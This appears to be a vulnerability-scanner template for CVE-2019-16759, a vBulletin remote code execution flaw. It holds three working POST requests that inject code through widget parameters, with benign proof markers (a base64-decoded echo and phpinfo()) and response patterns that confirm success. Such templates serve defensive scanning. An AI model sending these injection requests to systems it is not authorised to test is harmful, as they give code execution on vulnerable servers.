id: CVE-2019-16759
info:
  name: vBulletin RCE
  risk: High

params:
  - root: '{{.BaseURL}}/'
  
variables:
requests: 
  - method: POST
    url: >-
      {{.root}}index.php?routestring=ajax/render/widget_php
    headers:
      - User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3984.0 Safari/537.36
    data: widgetConfig[code]=echo%20%27bm9uZXhpc3RlbnQ6MTMzNwo=%27%20|%20base64%20-d;%20exit;
    detections:
      - >-
        StatusCode() == 200 && RegexSearch("resBody", "nonexistent:1337")
  - method: POST
    url: >-
      {{.root}}
    headers:
      - User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3984.0 Safari/537.36
    data: {"routestring":"ajax\/render\/widget_php","widgetConfig[code]":"echo 'bm9uZXhpc3RlbnQ6MTMzNwo=' | base64 -d; exit;"}
    detections:
      - >-
        StatusCode() == 200 && RegexSearch("resBody", "nonexistent:1337")
  - method: POST
    url: >-
      {{.root}}ajax/render/widget_tabbedcontainer_tab_panel
    headers:
      - User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3984.0 Safari/537.36
    data: subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();
    detections:
      - >-
        StatusCode() == 200 && RegexSearch("resBody", "PHP Version")

references:
  - https://www.cvebase.com/cve/2019/16759
